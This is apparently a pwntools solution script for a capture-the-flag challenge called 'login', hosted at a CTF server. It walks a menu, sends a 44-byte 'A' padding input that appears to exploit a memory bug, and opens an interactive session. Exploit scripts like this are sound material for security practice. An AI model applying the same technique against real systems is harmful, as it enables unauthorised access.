from pwn import *

#p = process('./login')
#p = remote('localhost', 13226)
p = remote('chal.utc-ctf.club', 13226)

def choice(ch):
    p.recvuntil('*** WIN')
    p.recvuntil('> ')
    p.sendline(str(ch))


choice(1)
p.sendline('user')
choice(4)
choice(2)
pause()
choice(3)
p.sendline('A' * 44)
choice(5)
choice(3)
p.interactive()
